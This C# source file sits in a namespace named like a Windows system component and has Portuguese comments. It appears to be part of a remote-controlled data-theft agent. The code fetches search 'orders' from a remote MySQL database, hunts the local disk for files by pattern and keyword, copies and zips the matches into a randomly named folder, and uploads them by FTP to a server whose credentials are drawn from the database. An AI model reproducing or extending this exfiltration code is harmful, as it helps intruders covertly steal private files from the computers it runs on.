using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace Windows_Driver_Foundation
{
    class classProcessSearchFileOrders
    {
        private static classMySQLDatabase classMysql;
        private static classPathsManagement pathsManagement;
        private static classFilesManagement classFilesManag;
        private static classFTPManagement ftpManagement;
        private static classExeptionAndErrorManagement classExeption;

        public void execute_SearchFile_protocol(int uid)
        {
            classExeption = new classExeptionAndErrorManagement();
            classExeption.printConsole("execute_SearchFile_protocol()","NEW CYCLE AT: " + DateTime.Now.ToString("dd/MM/yy H:mm:ss"));
            classFilesManag = new classFilesManagement();
            pathsManagement = new classPathsManagement();
            classMysql = new classMySQLDatabase();

            classMysql.openDatabaseConnection();

            List<int> pending_searchFileOrders = classMysql.getIds_OfUserSearchOrders(uid);

            if (pending_searchFileOrders.Any()) //Verifica se existe ordens pedentes, se sim então...
            {
                foreach (int id_selected in pending_searchFileOrders)
                {
                    string[] row_fields = classMysql.read_tblSearchOrdersFields(id_selected);

                    /*tbl_search_orders
                     * row_fields[0] = id
                     * row_fields[1] = client_id
                     * row_fields[2] = order_date
                     * row_fields[3] = folder_path
                     * row_fields[4] = search_pattern
                     * row_fields[5] = search_wordfilter
                     * row_fields[6] = search_recursively
                     * row_fields[7] = order_result
                     * row_fields[8] = order_status ( 1- pending order, 2- order readed, 3- order executed )  */

                    classExeption.printConsole("execute_SearchFile_protocol()", "Id Selected: " + id_selected.ToString() + "     Path: " + row_fields[3]);

                    //Actualiza a tbl_search_orders como "ordem lida"
                    classMysql.update_searchOrdersStatus(id_selected, 0, '2');
                    classExeption.printConsole("execute_SearchFiles_protocol()", "Ordem com o id " + id_selected + " lida. DB updated: order_status= 2");

                    //Converte o caminho de uma ordem de pesquisa para um caminho completo (pois na DB pode estar algo como "020+"
                    string path_cleaned = pathsManagement.filterAndCleanDBSearchPath(row_fields[3]);
                    classExeption.printConsole("execute_SearchFile_protocol()", "Caminho na BD:  " + row_fields[3] + "     Caminho Convertido: " + path_cleaned);

                    int count_files = 0; //conta ficheiros encontrados
                    //PROCURA PELOS FICHEIROS REQUERIDOS NA PASTA DESEJADA
                    foreach (string search_result in classFilesManag.searchDocumentByWord(path_cleaned, row_fields[4], row_fields[5], row_fields[6]).Distinct())
                    {
                        //.Distict() remove caminhos repetidos gerados por multiplas referencias à mesma palavra encontrada. 
                        //Por exemplo: A mesma palavra do searchfilter pode ser encontrada multiplas vezes no mesmo ficheiro e assim sendo gerava varias vezes o mesmo caminho. 

                        //Insere os ficheiros encontrados na DB
                        classMysql.insert_file_list(id_selected, uid, search_result, "0");
                        count_files++;
                    }

                    classExeption.printConsole("execute_SearchFile_protocol()", "Ficheiros encontrados: " + count_files.ToString());

                    //Actualiza na tbl_search_orders como "ordem executada"
                    classMysql.update_searchOrdersStatus(id_selected , count_files, '3'); //Actualiza o order_status para 3 ( 2= Executed )
                }
            }
            else
            {
                classExeption.printConsole("execute_SearchFile_protocol()", "Não existem ordens de pesquisa pedentes");
            }

            classMysql.closeDatabaseConnection();
        }


        /* execute_zipOrders_protocol To Do List
         * 1- Cria uma pasta com nome aleatorio.
         * 2- Copia todos os ficheiros para esta pasta.
         * 3- Zipa a pasta
         * 4- Apaga a pasta
         * 5- Adiciona o Zip na tbl_file_list como ficheiro para upload.  */
        public void execute_zipOrders_protocol(int uid)
        {
            classExeption = new classExeptionAndErrorManagement();
            classFilesManag = new classFilesManagement();
            classMysql = new classMySQLDatabase();

            classMysql.openDatabaseConnection();
            
            /* tbl_files_list GUIDE listing_status Guide
             *  listing_status = 10 - Ordem para upload via zip
             *  listing_status = 20 - Ordem Lida
             *  listing_status = 30 - Ficheiro copiado
             *  listing_status = 4  - Ficheiro não existe
             *  listing_status = 50 - Erro ao copiar
             *  listing_status = 51 - Erro ao zipar
             *  listing_status = 'nome do zip' -> ficheiro zipadp */

            //Guarda todos os caminhos dos ficheiros para zipar
            string[] files_to_zip = classMysql.get_uploadOrdersPaths(uid, 10).Distinct().ToArray();

            if (files_to_zip.Length > 0)
            {
                classExeption.printConsole("execute_zipOrders_protocol", "Existe ficheiros pendentes para zipar e fazer upload");

                //Cria a pasta com nome aleatório
                string targetZipfolderPath = @".\" + classFilesManag.GenerateName(5);
                if (classFilesManag.createDirectory(targetZipfolderPath))
                {
                    classExeption.printConsole("execute_zipOrders_protocol", "Pasta " + targetZipfolderPath + " criada com sucesso.");

                    //Copia todos os ficheiros para a pasta
                    foreach (string selected_file_path in files_to_zip)
                    {
                        classExeption.printConsole("execute_zipOrders_protocol", "Ficheiro " + selected_file_path + " selecionado.");

                        if (File.Exists(selected_file_path))
                        {
                            if (classFilesManag.copyFile(selected_file_path, System.IO.Path.Combine(targetZipfolderPath, System.IO.Path.GetFileName(selected_file_path).ToString())))
                            {
                                classMysql.update_filesListingStatus(uid, selected_file_path, "30");
                                classExeption.printConsole("execute_zipOrders_protocol", "Ficheiro " + selected_file_path + " copiado e actualizado na DB");
                            }
                            else
                            {
                                classMysql.update_filesListingStatus(uid, selected_file_path, "50");
                                classExeption.printConsole("execute_zipOrders_protocol", "ERRO ao copiar " + selected_file_path + ". Actualizado na DB");
                            }
                        }
                        else
                        {
                            classExeption.printConsole("execute_zipOrders_protocol", "Ficheiro " + selected_file_path + " NÃO EXISTE OU FOI APAGADO!");
                            if (classMysql.update_filesListingStatus(uid, selected_file_path, "4"))
                                classExeption.printConsole("execute_zipOrders_protocol", "Informação actualizada na DB");
                        }
                    }

                    //zipa a pasta
                    if (classFilesManag.ZipDirectory(targetZipfolderPath, targetZipfolderPath))
                    {
                        classExeption.printConsole("execute_zipOrders_protocol", "Zip: " + targetZipfolderPath + ".zip criado");

                        //apaga a pasta 
                        if (classFilesManag.deleteDirectory(targetZipfolderPath))
                            classExeption.printConsole("execute_zipOrders_protocol", "Pasta " + targetZipfolderPath + " Apagada");

                        //Insere o ficheiro .zip recém criado na tbl_files_list com ordem para upload (listing status: 1 - upload directo)
                        if (classMysql.insert_file_list(0, uid, targetZipfolderPath + ".zip", "1")) //order_id 0 = porque este ficheiro nao vem de nenhuma search_order
                            classExeption.printConsole("execute_zipOrders_protocol", "Zip inserido na DB.");

                        //Actualiza o 'listing_status' com o nome do zip criado em todos os ficheiros que foram Zipados.
                        foreach (string path in files_to_zip)
                        {
                            classMysql.update_filesListingStatus(uid, path, targetZipfolderPath.Replace(@".\", ""));
                            classExeption.printConsole("execute_zipOrders_protocol", "listing_status do ficheiro: " + path + " actualizado com sucesso.");
                        }
                    }
                    else
                    {
                        classExeption.printConsole("execute_zipOrders_protocol", "ERRO ao Zipar");
                    }

                }
            }
            else
                classExeption.printConsole("execute_zipOrders_protocol()", "Não existe ficheiro para zipar");

            classMysql.closeDatabaseConnection();
        }

        // Este metodo faz o ulpload de todos os ficheiros registados na base de dados com ordem de upload.
        public void execute_uploadOrders_protocol(int uid)
        {
            classExeption = new classExeptionAndErrorManagement();
            classFilesManag = new classFilesManagement();
            classMysql = new classMySQLDatabase();
            classMysql.openDatabaseConnection();

            string[] ftpLogin = classMysql.read_tblFTPServers(uid);

            if (!classExeption.IsNullOrEmpty(ftpLogin))
            {

                // Guarda todos os ficheiros para "Upload Directos = 1" (Sem Zip)
                string[] files_to_upload = classMysql.get_uploadOrdersPaths(uid, 1).Distinct().ToArray();

                /* tbl_files_list GUIDE
                 * listing_satus = 1 - Pending Order
                 * listing_satus = 2 - Order Readed (não esta activo este update de status PS: poupar recurso em caso de muitos ficheiros)
                 * listing_satus = 3 - Order Executed with sucesss
                 * listing_satus = 4 - File deleted or not exist
                 * listing_satus = 5 - FTP transfer error   */

                if (files_to_upload.Length > 0)
                {
                    // Calling FTP Class
                    ftpManagement = new classFTPManagement(ftpLogin[1], ftpLogin[2], ftpLogin[3]);
                    classMysql.insert_server_log(Convert.ToInt32(ftpLogin[0]), uid, 1); //FTP requiered
                    foreach (string selected_file_path in files_to_upload)
                    {
                        classExeption.printConsole("execute_uploadOrders", "Ficheiro " + selected_file_path + " selecionado");
                        if (File.Exists(selected_file_path))
                        {
                            if (ftpManagement.upload(Path.GetFileName(selected_file_path), selected_file_path))
                            {
                                classExeption.printConsole("execute_uploadOrders", "Ficheiro " + selected_file_path + " Uploaded to server.");

                                // Actualiza o status do ficheiro para ordem executada
                                classMysql.update_filesListingStatus(uid, selected_file_path, "3");
                                classMysql.insert_server_log(Convert.ToInt32(ftpLogin[0]), uid, 3);
                                classExeption.printConsole("execute_uploadOrders", "listing_stauts do ficheiro " + selected_file_path + " actualizado.");
                            }
                            else
                            {
                                // Caso o upload via FTP falhe o status do ficheiro vai mudar apenas para "ordem lida = 2" 
                                classMysql.update_filesListingStatus(uid, selected_file_path, "5");
                                classMysql.insert_server_log(Convert.ToInt32(ftpLogin[0]), uid, 30);
                                classExeption.printConsole("execute_uploadOrders", "Erro ao transferir o ficheiro " + selected_file_path + ".");
                            }
                        }
                        else
                        {

                            classExeption.printConsole("execute_uploadOrders", "Ficheiro " + selected_file_path + " NÃO EXISTE OU FOI APAGADO!");
                            classMysql.update_filesListingStatus(uid, selected_file_path, "4");
                            classExeption.printConsole("execute_uploadOrders", "Informação actualizada na DB");
                        }
                    }
                }
                else
                    classExeption.printConsole("execute_uploadOrders_protocol()", "Não existe ficheiro para Upload");
            }
            else
                classExeption.printConsole("execute_upload_orders()", "No FTP Credentials: Upload Files");

            classMysql.closeDatabaseConnection();
        }


    }
}
